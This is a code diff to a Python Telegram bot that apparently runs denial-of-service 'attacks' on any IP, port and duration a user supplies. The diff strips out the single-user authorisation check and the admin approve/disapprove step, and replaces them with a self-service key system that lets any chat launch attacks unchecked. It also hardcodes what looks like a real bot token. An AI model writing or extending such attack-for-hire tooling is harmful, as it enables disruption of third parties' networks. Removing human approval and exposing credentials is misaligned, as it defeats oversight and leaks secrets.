@@ -11,16 +11,19 @@ TELEGRAM_BOT_TOKEN = '7248127599:AAHwkME4J8unx-hS7dfiXTwgLfM2VsLfjAY'
 ALLOWED_USER_ID = 6135948216
 bot_access_free = True  
 
-# Store pending attack requests and keys
+# Store pending attack requests, keys, and redeemed keys
 pending_requests = {}
 user_keys = {}
+redeemed_keys = {}
 
 # Key expiry time (in seconds)
-KEY_EXPIRY_TIME = 300  # 5 minutes
+KEY_EXPIRY_TIME = 300  # 5 minutes for standard keys
+LONG_KEY_EXPIRY_TIME = 7200  # 120 minutes (2 hours) for the new long-term keys
+REDEEMED_KEY_EXPIRY_TIME = 600  # 10 minutes for redeemed keys
 
-def generate_key():
-    """Generate a random key."""
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+def generate_key(expiry_time=KEY_EXPIRY_TIME):
+    """Generate a random key with a custom expiry time."""
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=10)), expiry_time
 
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
@@ -55,111 +58,75 @@ async def attack(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id  # Get the ID of the user issuing the command
 
-    # Check if the user is allowed to use the bot
-    if user_id != ALLOWED_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
+    # Check if the user has redeemed a valid key
+    if chat_id not in redeemed_keys or redeemed_keys[chat_id]['expiry'] < time.time():
+        await context.bot.send_message(chat_id=chat_id, text="*❌ You don't have a valid redeemed key! Please redeem your key with /redeem <key>.*", parse_mode='Markdown')
         return
 
     args = context.args
-    if len(args) != 4:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration> <key>*", parse_mode='Markdown')
+    if len(args) != 3:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
         return
 
-    ip, port, duration, key = args
+    ip, port, duration = args
 
-    # Check if user has a valid key
-    if chat_id not in user_keys or user_keys[chat_id]['expiry'] < time.time():
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You don't have a valid key! Please generate a new one with /genkey.*", parse_mode='Markdown')
+    # Launch the attack
+    await context.bot.send_message(chat_id=chat_id, text=( 
+        f"*⚔️ Attack Launched! ⚔️*\n"
+        f"*🎯 Target: {ip}:{port}*\n"
+        f"*🕒 Duration: {duration} seconds*\n"
+        f"*🔥 Let the battlefield ignite! 💥*"
+    ), parse_mode='Markdown')
+
+    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
+
+async def redeem(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    args = context.args
+
+    if len(args) != 1:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <key>*", parse_mode='Markdown')
         return
 
-    if key != user_keys[chat_id]['key']:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid key. Please try again.*", parse_mode='Markdown')
+    key = args[0]
+
+    # Check if the key is valid and not expired
+    if chat_id not in user_keys or user_keys[chat_id]['key'] != key or user_keys[chat_id]['expiry'] < time.time():
+        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid or expired key! Please generate a new key using /genkey.*", parse_mode='Markdown')
         return
 
-    # Add pending request
-    pending_requests[chat_id] = (ip, port, duration)
+    # Redeem the key (mark it as redeemed and store the expiration time for the redeem period)
+    redeemed_keys[chat_id] = {'key': key, 'expiry': time.time() + REDEEMED_KEY_EXPIRY_TIME}
 
-    # Notify the admin (ALLOWED_USER_ID)
-    await context.bot.send_message(
-        chat_id=ALLOWED_USER_ID,
-        text=f"*⚔️ Attack Request Received! ⚔️*\n"
-             f"*User: {chat_id}*\n"
-             f"*Target: {ip}:{port}*\n"
-             f"*Duration: {duration} seconds*\n\n"
-             "Do you approve or disapprove this request? Use /approve <user_id> or /disapprove <user_id>."
-    )
-
+    # Inform the user
     await context.bot.send_message(
         chat_id=chat_id,
-        text="*⚔️ Your attack request is waiting for approval...*",
+        text=f"*🔑 Key Redeemed!*\nYour key is now active for performing actions like attacking.\n"
+             f"*🕒 You can use this key for {REDEEMED_KEY_EXPIRY_TIME // 60} minutes.*",
         parse_mode='Markdown'
     )
-
-async def approve(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-
-    if chat_id != ALLOWED_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to approve attacks!*", parse_mode='Markdown')
-        return
-
-    if len(context.args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /approve <user_id>*", parse_mode='Markdown')
-        return
-
-    user_id = context.args[0]
-
-    # Check if there is a pending request
-    if user_id not in pending_requests:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No pending attack requests for this user.*", parse_mode='Markdown')
-        return
-
-    ip, port, duration = pending_requests[user_id]
-    # Proceed to launch the attack
-    await context.bot.send_message(chat_id=user_id, text=f"*⚔️ Attack Approved! ⚔️*\n"
-                                                           f"Launching attack on {ip}:{port} for {duration} seconds...")
-    asyncio.create_task(run_attack(user_id, ip, port, duration, context))
-
-    # Remove the pending request after approval
-    del pending_requests[user_id]
-
-async def disapprove(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-
-    if chat_id != ALLOWED_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to disapprove attacks!*", parse_mode='Markdown')
-        return
-
-    if len(context.args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /disapprove <user_id>*", parse_mode='Markdown')
-        return
-
-    user_id = context.args[0]
-
-    # Check if there is a pending request
-    if user_id not in pending_requests:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No pending attack requests for this user.*", parse_mode='Markdown')
-        return
-
-    # Notify the user about disapproval
-    await context.bot.send_message(user_id, text="*❌ Your attack request has been disapproved.*")
-    
-    # Remove the pending request after disapproval
-    del pending_requests[user_id]
 
 async def genkey(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
 
-    # Generate a new key for the user
-    key = generate_key()
+    # Generate a standard key (valid for 5 minutes)
+    if len(context.args) == 0 or context.args[0] == 'short':
+        key, expiry_time = generate_key(KEY_EXPIRY_TIME)
+    # Generate a long-term key (valid for 120 minutes)
+    elif len(context.args) == 1 and context.args[0] == 'long':
+        key, expiry_time = generate_key(LONG_KEY_EXPIRY_TIME)
+    else:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /genkey [short|long]*", parse_mode='Markdown')
+        return
 
-    # Set the key expiration time
-    user_keys[chat_id] = {'key': key, 'expiry': time.time() + KEY_EXPIRY_TIME}
+    # Store the generated key for the user
+    user_keys[chat_id] = {'key': key, 'expiry': time.time() + expiry_time}
 
-    # Send the generated key to the user
+    # Send the generated key and expiry info to the user
     await context.bot.send_message(
         chat_id=chat_id,
         text=f"*🔑 Your key: {key}* \n"
-             f"*🕒 This key will expire in {KEY_EXPIRY_TIME // 60} minutes.*",
+             f"*🕒 This key will expire in {expiry_time // 60} minutes.*",
         parse_mode='Markdown'
     )
 
@@ -167,8 +134,7 @@ def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("attack", attack))
-    application.add_handler(CommandHandler("approve", approve))
-    application.add_handler(CommandHandler("disapprove", disapprove))
+    application.add_handler(CommandHandler("redeem", redeem))
     application.add_handler(CommandHandler("genkey", genkey))
 
     application.run_polling()
